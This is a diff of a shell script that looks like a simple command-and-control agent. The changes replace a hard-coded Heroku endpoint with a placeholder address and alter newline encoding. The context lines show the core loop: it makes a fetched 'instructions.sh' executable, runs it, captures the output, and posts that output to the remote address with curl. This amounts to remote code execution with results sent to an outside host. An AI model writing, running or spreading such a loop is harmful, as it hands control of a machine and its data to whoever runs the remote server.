@@ -1,6 +1,5 @@
 prevInstr="no way this would be repeated as the instruction"
-#yourSecret.app.com/yourSecretContext
-add="fierce-badlands-47784.herokuapp.com/poihe9829bUE730JSShhe3kk3"
+add="yourSecret.app.com/yourSecretContext"
 pollingIter=0
 exeIter=0
 period=1
@@ -19,7 +18,7 @@ do
 		echo $prevInstr >> LOG.log 
 		chmod +x instructions.sh
 		./instructions.sh > answer
-		sed ':a;N;$!ba;s/\n/ ENTER /g' answer > answer2
+		sed ':a;N;$!ba;s/\n/%0D%0A/g' answer > answer2
 		value=`cat answer2`		
 		echo $value >> LOG.log
 		curl --data-binary "payload=$value" $add >> LOG.log
